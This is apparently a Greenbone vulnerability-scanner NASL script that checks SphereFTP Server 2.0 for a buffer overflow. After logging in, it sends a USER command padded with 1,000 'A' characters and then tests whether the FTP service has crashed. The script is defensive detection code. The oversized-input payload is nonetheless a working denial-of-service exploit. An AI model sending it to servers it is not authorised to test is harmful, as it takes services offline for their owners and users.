# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:menasoft:sphereftpserver";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807534");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2016-04-04 16:23:30 +0530 (Mon, 04 Apr 2016)");
  script_name("SphereFTP Server Buffer Overflow vulnerability");

  script_tag(name:"summary", value:"SphereFTP server is prone to a buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request and check whether
  it is able to crash the application or not.");

  script_tag(name:"insight", value:"Flaw is due to an improper sanitization of
  user supplied input passed via the 'USER' command.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to cause denial of service condition resulting in loss of availability
  for the application.");

  script_tag(name:"affected", value:"SphereFTP Server v2.0, Other versions may
  also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38072");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("FTP");
  script_dependencies("gb_sphere_ftp_server_detect.nasl", "logins.nasl");
  script_mandatory_keys("SphereFTP Server/installed");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

soc = open_sock_tcp(ftpPort);
if(!soc) exit(0);

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  exit(0);
}

PAYLOAD = crap(data: "A", length:1000);
send(socket:soc, data:string("USER", PAYLOAD, '\r\n'));

ftp_close(socket:soc);

soc = open_sock_tcp(ftpPort);
if(!soc)
{
  security_message(ftpPort);
  exit(0);
}

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  security_message(ftpPort);
  exit(0);
}

ftp_close(socket:soc);
